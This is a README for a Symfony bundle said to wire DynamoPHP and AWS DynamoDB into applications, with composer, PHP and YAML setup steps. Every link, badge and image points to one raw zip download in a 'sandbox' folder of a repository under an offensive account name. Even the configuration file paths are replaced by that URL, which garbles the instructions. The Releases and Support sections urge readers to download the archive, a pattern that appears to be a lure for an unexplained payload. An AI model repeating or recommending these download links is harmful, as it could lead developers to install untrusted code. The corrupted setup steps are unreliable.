# DynamoPHP Symfony Bundle 🚀

![DynamoPHP Symfony Bundle](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip%20Symfony%https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip)  
[![Release](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip%20Latest%20Version-brightgreen)](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip)

Welcome to the DynamoPHP Symfony Bundle! This bundle integrates DynamoPHP into Symfony applications, allowing for seamless configuration and service registration. With this bundle, you can leverage the power of AWS DynamoDB in your Symfony projects.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Configuration](#configuration)
5. [Contributing](#contributing)
6. [License](#license)
7. [Support](#support)

## Features

- **Easy Integration**: Quickly integrate DynamoPHP with your Symfony application.
- **Service Registration**: Automatically register services for easier management.
- **Strongly Typed**: Benefit from type safety in your data models.
- **Single Table Design**: Optimize your database structure for performance.
- **Data Mapper**: Use a data mapper pattern for clean separation of concerns.
- **NoSQL Support**: Work seamlessly with NoSQL databases.
- **ORM Capabilities**: Take advantage of Object-Relational Mapping for easier data handling.

## Installation

To install the DynamoPHP Symfony Bundle, follow these steps:

1. **Install via Composer**: Run the following command in your project directory:

   ```bash
   composer require nonstophitler/dynamophp-symfony
   ```

2. **Add Bundle to Kernel**: Register the bundle in your `https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip` file:

   ```php
   return [
       // Other bundles...
       NonStopHitler\DynamoPHPBundle\DynamoPHPBundle::class => ['all' => true],
   ];
   ```

3. **Configuration**: After installation, configure the bundle in your `https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip` file.

## Usage

Once you have installed the bundle, you can start using it in your application.

### Basic Example

To use the DynamoPHP service, you can inject it into your controllers or services:

```php
use NonStopHitler\DynamoPHPBundle\Service\DynamoDBService;

class MyController extends AbstractController
{
    private $dynamoDBService;

    public function __construct(DynamoDBService $dynamoDBService)
    {
        $this->dynamoDBService = $dynamoDBService;
    }

    public function index()
    {
        $data = $this->dynamoDBService->getData('my_table', 'my_key');
        return $this->json($data);
    }
}
```

### Advanced Usage

For more advanced scenarios, you can use the data mapper feature to handle complex data structures. Define your models and map them to your DynamoDB tables. This approach helps maintain a clean architecture and separates your business logic from data access.

## Configuration

You can configure the DynamoPHP Symfony Bundle by editing the `https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip` file. Here is an example configuration:

```yaml
dynamo_php:
    aws:
        region: 'us-east-1'
        version: 'latest'
        credentials:
            key: '%env(AWS_ACCESS_KEY_ID)%'
            secret: '%env(AWS_SECRET_ACCESS_KEY)%'
    table:
        name: 'my_table'
        primary_key: 'my_key'
```

### Environment Variables

Make sure to set the necessary environment variables in your `.env` file:

```
AWS_ACCESS_KEY_ID=your_access_key
AWS_SECRET_ACCESS_KEY=your_secret_key
```

## Contributing

We welcome contributions to the DynamoPHP Symfony Bundle! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and create a pull request.

Please ensure that your code follows the project's coding standards and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

For support, please visit the [Releases](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip) section. Here you can find the latest versions and download them for your project.

## Conclusion

The DynamoPHP Symfony Bundle provides a robust solution for integrating AWS DynamoDB into your Symfony applications. With its easy setup, strong typing, and powerful features, you can streamline your data management processes. We hope you find this bundle useful for your projects. Happy coding!

For more information, please check the [Releases](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip) section for updates and new features.